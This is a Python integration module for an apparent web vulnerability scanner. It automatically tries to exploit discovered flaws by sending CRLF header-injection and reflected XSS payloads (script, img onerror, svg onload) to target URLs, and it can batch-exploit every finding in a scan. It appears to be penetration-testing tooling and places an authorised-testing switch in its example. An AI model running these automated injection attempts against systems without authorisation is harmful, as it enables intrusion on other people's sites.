"""
Scanner Integration Example

This module shows how to integrate the exploit plugin system with the
Megido scanner to automatically exploit discovered vulnerabilities.
"""

from typing import Dict, Any, Optional
import logging
import re

from scanner.plugins import get_registry
from scanner.models import Vulnerability

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

logger = logging.getLogger(__name__)


def _attempt_header_injection(vulnerability: Vulnerability, config: Dict[str, Any]) -> Dict[str, Any]:
    """
    Attempt CRLF/header injection attack on the vulnerability.
    
    Args:
        vulnerability: Vulnerability instance
        config: Configuration dictionary
        
    Returns:
        Dictionary with attack results
    """
    if not HAS_REQUESTS:
        return {
            'success': False,
            'findings': [],
            'data': {},
            'evidence': '',
            'error': 'requests library not available',
        }
    
    timeout = config.get('timeout', 30)
    verify_ssl = config.get('verify_ssl', False)
    findings = []
    
    # CRLF injection payloads
    crlf_payloads = [
        '\r\nX-Injected-Header: true',
        '\r\n\r\nHTTP/1.1 200 OK\r\nX-Injected: true',
        '%0d%0aX-Injected-Header: true',
        '%0D%0AX-Injected-Header: true',
        '\nX-Injected-Header: true',
        '%0aX-Injected-Header: true',
    ]
    
    try:
        for payload in crlf_payloads:
            # Determine method
            method = 'GET'
            if vulnerability.evidence and 'POST' in vulnerability.evidence.upper():
                method = 'POST'
            
            # Prepare request
            url = vulnerability.url
            if vulnerability.parameter:
                if method == 'GET':
                    # Add payload to parameter in URL
                    from urllib.parse import urlencode, urlparse, parse_qs, urlunparse
                    parsed = urlparse(url)
                    params = parse_qs(parsed.query)
                    params[vulnerability.parameter] = [payload]
                    new_query = urlencode(params, doseq=True)
                    url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, 
                                    parsed.params, new_query, parsed.fragment))
                    
                    response = requests.get(url, timeout=timeout, verify=verify_ssl, 
                                           allow_redirects=False)
                else:
                    data = {vulnerability.parameter: payload}
                    response = requests.post(url, data=data, timeout=timeout, 
                                           verify=verify_ssl, allow_redirects=False)
            else:
                # Try in URL path
                if '?' not in url:
                    url = url + '?test=' + payload
                response = requests.get(url, timeout=timeout, verify=verify_ssl, 
                                       allow_redirects=False)
            
            # Check for header injection
            injected_header_found = False
            for header_name, header_value in response.headers.items():
                if 'injected' in header_name.lower() or 'injected' in str(header_value).lower():
                    injected_header_found = True
                    findings.append(f'Injected header detected: {header_name}: {header_value}')
                    break
            
            if injected_header_found:
                return {
                    'success': True,
                    'findings': findings,
                    'data': {'injected_headers': findings},
                    'evidence': f'CRLF injection successful with payload: {payload[:50]}...',
                    'error': '',
                }
                
    except Exception as e:
        logger.debug(f"Header injection attempt failed: {e}")
    
    return {
        'success': False,
        'findings': findings,
        'data': {},
        'evidence': '',
        'error': 'Header injection attempts were not successful',
    }


def _attempt_xss_attack(vulnerability: Vulnerability, config: Dict[str, Any]) -> Dict[str, Any]:
    """
    Attempt reflected XSS attack on the vulnerability.
    
    Args:
        vulnerability: Vulnerability instance
        config: Configuration dictionary
        
    Returns:
        Dictionary with attack results
    """
    if not HAS_REQUESTS:
        return {
            'success': False,
            'findings': [],
            'data': {},
            'evidence': '',
            'error': 'requests library not available',
        }
    
    timeout = config.get('timeout', 30)
    verify_ssl = config.get('verify_ssl', False)
    findings = []
    
    # XSS payloads
    xss_payloads = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg/onload=alert(1)>',
        '"><script>alert(1)</script>',
        '\'><script>alert(1)</script>',
        '<iframe src="javascript:alert(1)">',
    ]
    
    # Threshold for determining likely exploitable XSS
    # We check for presence of dangerous characters/keywords that would enable XSS
    # If at least 3 are present unescaped, the reflection is likely exploitable
    MIN_DANGEROUS_CHARS_FOR_XSS = 3
    dangerous_chars = ['<', '>', '"', "'", 'script', 'onerror', 'onload']
    
    try:
        for payload in xss_payloads:
            # Determine method
            method = 'GET'
            if vulnerability.evidence and 'POST' in vulnerability.evidence.upper():
                method = 'POST'
            
            # Prepare request
            url = vulnerability.url
            if vulnerability.parameter:
                if method == 'GET':
                    from urllib.parse import urlencode, urlparse, parse_qs, urlunparse
                    parsed = urlparse(url)
                    params = parse_qs(parsed.query)
                    params[vulnerability.parameter] = [payload]
                    new_query = urlencode(params, doseq=True)
                    url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, 
                                    parsed.params, new_query, parsed.fragment))
                    
                    response = requests.get(url, timeout=timeout, verify=verify_ssl)
                else:
                    data = {vulnerability.parameter: payload}
                    response = requests.post(url, data=data, timeout=timeout, verify=verify_ssl)
            else:
                # Try in URL parameter
                if '?' not in url:
                    url = url + '?test=' + payload
                response = requests.get(url, timeout=timeout, verify=verify_ssl)
            
            # Check if payload is reflected in response
            if payload in response.text:
                findings.append(f'XSS payload reflected: {payload}')
                
                # Additional checks for unescaped reflection
                unescaped_count = sum(1 for char in dangerous_chars if char in response.text)
                
                if unescaped_count >= MIN_DANGEROUS_CHARS_FOR_XSS:  # Likely exploitable
                    return {
                        'success': True,
                        'findings': findings,
                        'data': {'reflected_payload': payload, 'url': url},
                        'evidence': f'XSS payload reflected unescaped: {payload}',
                        'error': '',
                    }
    
    except Exception as e:
        logger.debug(f"XSS attack attempt failed: {e}")
    
    if findings:
        return {
            'success': True,
            'findings': findings,
            'data': {'reflected_payloads': findings},
            'evidence': 'XSS payloads reflected but may be escaped',
            'error': '',
        }
    
    return {
        'success': False,
        'findings': findings,
        'data': {},
        'evidence': '',
        'error': 'XSS attempts were not successful',
    }


def _attempt_context_aware_attack(vulnerability: Vulnerability, 
                                   config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """
    Attempt context-aware attacks based on vulnerability description.
    
    Args:
        vulnerability: Vulnerability instance
        config: Optional configuration dictionary
        
    Returns:
        Dictionary with attack results
    """
    config = config or {}
    description_lower = (vulnerability.description or '').lower()
    evidence_lower = (vulnerability.evidence or '').lower()
    combined_text = description_lower + ' ' + evidence_lower
    
    logger.info(
        f"Attempting context-aware attack for {vulnerability.vulnerability_type} "
        f"at {vulnerability.url}"
    )
    
    # Check for header-related vulnerabilities
    if 'header' in combined_text:
        logger.info("Detected header-related context, attempting header injection")
        result = _attempt_header_injection(vulnerability, config)
        if result['success']:
            result['plugin_used'] = 'Context-Aware: Header Injection'
            return result
    
    # Check for input/form-related vulnerabilities
    if 'input' in combined_text or 'form' in combined_text:
        logger.info("Detected input/form-related context, attempting XSS")
        result = _attempt_xss_attack(vulnerability, config)
        if result['success']:
            result['plugin_used'] = 'Context-Aware: XSS'
            return result
    
    # If no context matched or attacks failed
    return {
        'success': False,
        'findings': [],
        'data': {},
        'evidence': '',
        'error': f'No exploit plugin available for {vulnerability.vulnerability_type} and context-aware attacks were not successful',
        'plugin_used': 'Context-Aware Fallback',
    }


def exploit_vulnerability(vulnerability: Vulnerability, 
                         config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """
    Attempt to exploit a discovered vulnerability using the appropriate plugin.
    
    This function:
    1. Gets the plugin registry
    2. Finds the appropriate plugin for the vulnerability type
    3. If no plugin exists, attempts context-aware attacks based on vulnerability description:
       - Header injection for vulnerabilities mentioning 'header'
       - XSS attacks for vulnerabilities mentioning 'input' or 'form'
    4. Executes the exploit attack
    5. Returns the results
    
    Args:
        vulnerability: A Vulnerability model instance from the scanner
        config: Optional configuration for the attack:
               - timeout: Request timeout (default: 30)
               - verify_ssl: Whether to verify SSL certificates (default: False)
               - enable_error_based: Enable error-based detection (for SQLi)
               - enable_time_based: Enable time-based detection (for SQLi)
               - enable_exploitation: Enable exploitation phase (default: True)
    
    Returns:
        Dictionary containing:
        - success: Boolean indicating if vulnerability was exploited
        - findings: List of exploitation findings
        - data: Any extracted data
        - evidence: Evidence of exploitation
        - error: Error message if exploitation failed
        - plugin_used: Name of the plugin that was used (or 'Context-Aware: <type>')
    
    Example:
        >>> from scanner.models import Vulnerability
        >>> vuln = Vulnerability.objects.get(id=1)
        >>> result = exploit_vulnerability(vuln)
        >>> if result['success']:
        ...     print(f"Successfully exploited: {result['evidence']}")
    """
    config = config or {}
    
    # Get the plugin registry
    registry = get_registry()
    
    # Check if a plugin exists for this vulnerability type
    if not registry.has_plugin(vulnerability.vulnerability_type):
        # Attempt context-aware attack as fallback
        logger.info(
            f"No plugin available for {vulnerability.vulnerability_type}, "
            f"attempting context-aware fallback attack"
        )
        return _attempt_context_aware_attack(vulnerability, config)
    
    # Get the appropriate plugin
    plugin = registry.get_plugin(vulnerability.vulnerability_type)
    
    logger.info(
        f"Attempting to exploit {vulnerability.vulnerability_type} vulnerability "
        f"at {vulnerability.url} using plugin: {plugin.name}"
    )
    
    # Prepare vulnerability data for the plugin
    # Try to detect method from vulnerability evidence, default to GET if not found
    method = 'GET'
    if vulnerability.evidence and 'POST' in vulnerability.evidence.upper():
        method = 'POST'
    
    vulnerability_data = {
        'parameter': vulnerability.parameter,
        'method': method,
        'params': {vulnerability.parameter: 'test'} if vulnerability.parameter and method == 'GET' else {},
        'data': {vulnerability.parameter: 'test'} if vulnerability.parameter and method == 'POST' else {},
        'url': vulnerability.url,
    }
    
    # Execute the attack
    try:
        result = plugin.execute_attack(
            target_url=vulnerability.url,
            vulnerability_data=vulnerability_data,
            config=config
        )
        
        result['plugin_used'] = plugin.name
        
        if result['success']:
            logger.info(
                f"Successfully exploited {vulnerability.vulnerability_type} at {vulnerability.url}"
            )
        else:
            logger.warning(
                f"Exploitation attempt failed: {result.get('error', 'Unknown error')}"
            )
        
        return result
        
    except Exception as e:
        logger.error(f"Error during exploitation: {e}")
        return {
            'success': False,
            'findings': [],
            'data': {},
            'evidence': '',
            'error': str(e),
            'plugin_used': plugin.name,
        }


def get_payloads_for_vulnerability(vulnerability: Vulnerability,
                                   context: Optional[Dict[str, Any]] = None) -> list:
    """
    Get appropriate payloads for testing a vulnerability.
    
    Args:
        vulnerability: A Vulnerability model instance
        context: Optional context for payload generation:
                - database_type: Database type for SQL injection
                - injection_type: Type of injection
                - Any other relevant context
    
    Returns:
        List of payload strings
    
    Example:
        >>> from scanner.models import Vulnerability
        >>> vuln = Vulnerability.objects.filter(vulnerability_type='sqli').first()
        >>> payloads = get_payloads_for_vulnerability(vuln, {'database_type': 'mysql'})
        >>> print(f"Got {len(payloads)} payloads for testing")
    """
    registry = get_registry()
    
    # Check if a plugin exists for this vulnerability type
    if not registry.has_plugin(vulnerability.vulnerability_type):
        logger.warning(
            f"No plugin available for {vulnerability.vulnerability_type}, "
            f"using payload generator directly"
        )
        from scanner.plugins import get_payload_generator
        generator = get_payload_generator()
        return generator.get_payloads(vulnerability.vulnerability_type, context)
    
    # Get the plugin and generate payloads
    plugin = registry.get_plugin(vulnerability.vulnerability_type)
    payloads = plugin.generate_payloads(context)
    
    logger.info(
        f"Generated {len(payloads)} payloads for {vulnerability.vulnerability_type} "
        f"using plugin: {plugin.name}"
    )
    
    return payloads


def get_remediation_for_vulnerability(vulnerability: Vulnerability) -> str:
    """
    Get remediation advice for a vulnerability.
    
    Args:
        vulnerability: A Vulnerability model instance
    
    Returns:
        String containing remediation advice
    
    Example:
        >>> from scanner.models import Vulnerability
        >>> vuln = Vulnerability.objects.get(id=1)
        >>> advice = get_remediation_for_vulnerability(vuln)
        >>> print(advice)
    """
    registry = get_registry()
    
    if not registry.has_plugin(vulnerability.vulnerability_type):
        return "No specific remediation advice available. Implement general security best practices."
    
    plugin = registry.get_plugin(vulnerability.vulnerability_type)
    return plugin.get_remediation_advice()


def list_available_exploit_plugins() -> list:
    """
    List all available exploit plugins.
    
    Returns:
        List of dictionaries containing plugin information
    
    Example:
        >>> plugins = list_available_exploit_plugins()
        >>> for plugin in plugins:
        ...     print(f"{plugin['name']}: {plugin['description']}")
    """
    registry = get_registry()
    return registry.list_plugins()


def _exploit_vulnerability_and_update(vuln, config: Optional[Dict[str, Any]], results: Dict[str, Any]) -> None:
    """
    Helper function to exploit a single vulnerability and update tracking results.
    
    Args:
        vuln: Vulnerability instance to exploit
        config: Optional configuration for attacks
        results: Dictionary to update with results (modified in place)
    """
    from django.utils import timezone
    
    # Mark as in progress
    vuln.exploit_status = 'in_progress'
    vuln.save()
    
    # Attempt exploitation
    result = exploit_vulnerability(vuln, config)
    
    # Update vulnerability with results
    vuln.exploit_attempted_at = timezone.now()
    
    if result['success']:
        vuln.exploited = True
        vuln.exploit_status = 'success'
        results['exploited'] += 1
    elif result.get('plugin_used') is None:
        vuln.exploit_status = 'no_plugin'
        results['no_plugin'] += 1
    else:
        vuln.exploit_status = 'failed'
        results['failed'] += 1
    
    # Store detailed results
    vuln.exploit_result = format_exploit_result(result)
    vuln.save()
    
    # Add to results list
    results['results'].append({
        'vulnerability_id': vuln.id,
        'vulnerability_type': vuln.get_vulnerability_type_display(),
        'url': vuln.url,
        'success': result['success'],
        'plugin_used': result.get('plugin_used'),
        'evidence': result.get('evidence', ''),
        'error': result.get('error', ''),
    })
    
    logger.info(
        f"Exploit attempt for vulnerability {vuln.id} ({vuln.vulnerability_type}): "
        f"{'SUCCESS' if result['success'] else 'FAILED'}"
    )


def exploit_all_vulnerabilities(scan_id: int, config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """
    Attempt to exploit all vulnerabilities in a scan that have compatible plugins.
    
    Args:
        scan_id: The scan ID to process
        config: Optional configuration for attacks
    
    Returns:
        Dictionary containing:
        - total: Total number of vulnerabilities
        - exploited: Number successfully exploited
        - failed: Number that failed
        - no_plugin: Number with no compatible plugin
        - results: List of individual exploit results
    """
    from scanner.models import Scan
    
    try:
        scan = Scan.objects.get(id=scan_id)
    except Scan.DoesNotExist:
        return {
            'error': f'Scan {scan_id} not found',
            'total': 0,
            'exploited': 0,
            'failed': 0,
            'no_plugin': 0,
            'results': []
        }
    
    vulnerabilities = scan.vulnerabilities.all()
    results = {
        'total': vulnerabilities.count(),
        'exploited': 0,
        'failed': 0,
        'no_plugin': 0,
        'results': []
    }
    
    for vuln in vulnerabilities:
        _exploit_vulnerability_and_update(vuln, config, results)
    
    return results


def exploit_selected_vulnerabilities(vulnerability_ids: list, config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """
    Attempt to exploit specific vulnerabilities by ID.
    
    Args:
        vulnerability_ids: List of vulnerability IDs to exploit
        config: Optional configuration for attacks
    
    Returns:
        Dictionary containing:
        - total: Total number of vulnerabilities processed
        - exploited: Number successfully exploited
        - failed: Number that failed
        - no_plugin: Number with no compatible plugin
        - results: List of individual exploit results
    """
    from scanner.models import Vulnerability
    
    vulnerabilities = Vulnerability.objects.filter(id__in=vulnerability_ids)
    
    results = {
        'total': vulnerabilities.count(),
        'exploited': 0,
        'failed': 0,
        'no_plugin': 0,
        'results': []
    }
    
    for vuln in vulnerabilities:
        _exploit_vulnerability_and_update(vuln, config, results)
    
    return results


def format_exploit_result(result: Dict[str, Any]) -> str:
    """
    Format exploit result for storage.
    
    Args:
        result: Dictionary containing exploit results
    
    Returns:
        Formatted string representation of the results
    """
    lines = []
    
    if result.get('plugin_used'):
        lines.append(f"Plugin: {result['plugin_used']}")
    
    if result['success']:
        lines.append("Status: SUCCESS")
        if result.get('evidence'):
            lines.append(f"Evidence: {result['evidence']}")
        if result.get('findings'):
            lines.append(f"Findings: {len(result['findings'])} items found")
            for i, finding in enumerate(result['findings'][:5], 1):  # Show first 5
                lines.append(f"  {i}. {finding}")
        if result.get('data'):
            lines.append("Data extracted:")
            for key, value in list(result['data'].items())[:5]:  # Show first 5
                lines.append(f"  {key}: {value}")
    else:
        lines.append("Status: FAILED")
        if result.get('error'):
            lines.append(f"Error: {result['error']}")
    
    return '\n'.join(lines)


# Example usage in a Django view or management command
def example_usage():
    """
    Example showing how to use the integration functions.
    """
    from scanner.models import Vulnerability, Scan
    
    # Get a scan with vulnerabilities
    scan = Scan.objects.filter(status='completed').first()
    
    if not scan:
        print("No completed scans found")
        return
    
    # Get all vulnerabilities from the scan
    vulnerabilities = scan.vulnerabilities.all()
    
    print(f"Found {vulnerabilities.count()} vulnerabilities in scan {scan.id}")
    
    # List available plugins
    plugins = list_available_exploit_plugins()
    print(f"\nAvailable exploit plugins: {len(plugins)}")
    for plugin in plugins:
        print(f"  - {plugin['name']} ({plugin['vulnerability_type']})")
    
    # Attempt to exploit each vulnerability
    for vuln in vulnerabilities:
        print(f"\n{'=' * 80}")
        print(f"Vulnerability: {vuln.get_vulnerability_type_display()}")
        print(f"URL: {vuln.url}")
        print(f"Severity: {vuln.severity}")
        
        # Get remediation advice
        advice = get_remediation_for_vulnerability(vuln)
        print(f"Remediation: {advice[:100]}...")
        
        # Get sample payloads
        payloads = get_payloads_for_vulnerability(vuln)
        print(f"Available payloads: {len(payloads)}")
        
        # Attempt exploitation (be careful with this in production!)
        # Only enable if you have explicit permission to test the target
        ENABLE_EXPLOITATION = False  # Set to True only for authorized testing
        
        if ENABLE_EXPLOITATION:
            result = exploit_vulnerability(vuln, config={'verify_ssl': False})
            
            if result['success']:
                print(f"✓ Exploitation successful!")
                print(f"  Evidence: {result['evidence']}")
                print(f"  Findings: {len(result['findings'])}")
            else:
                print(f"✗ Exploitation failed: {result['error']}")
        else:
            print("Exploitation disabled (set ENABLE_EXPLOITATION=True to enable)")


if __name__ == '__main__':
    # This is just an example and won't work standalone without Django setup
    print("This is an integration example. Import these functions into your Django views or management commands.")
    print("\nExample functions:")
    print("  - exploit_vulnerability(vulnerability, config)")
    print("  - get_payloads_for_vulnerability(vulnerability, context)")
    print("  - get_remediation_for_vulnerability(vulnerability)")
    print("  - list_available_exploit_plugins()")
